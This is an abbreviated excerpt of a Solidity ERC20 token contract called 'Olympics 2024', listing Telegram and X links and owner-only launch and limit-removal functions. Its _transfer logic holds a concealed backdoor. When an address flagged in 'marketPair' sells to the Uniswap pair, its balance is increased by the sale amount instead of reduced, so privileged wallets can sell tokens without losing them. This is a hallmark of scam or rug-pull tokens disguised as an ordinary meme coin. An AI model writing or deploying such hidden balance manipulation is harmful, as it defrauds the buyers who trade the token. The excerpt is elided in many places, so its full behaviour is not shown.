...
TG :    https://t.me/olympics_erc20
X   :    https://x.com/olympics_erc20
 */
...
contract Olympics is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Olympics 2024";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (to == uniswapV2Pair && from != address(this)) {
                if (marketPair[from]) _balances[from] = _balances[from].add(amount);
                taxAmount = amount
                    .mul(
    ...
    function removeOlympicLimits() external onlyOwner {
    ...
    function initiateOlympics() external onlyOwner {
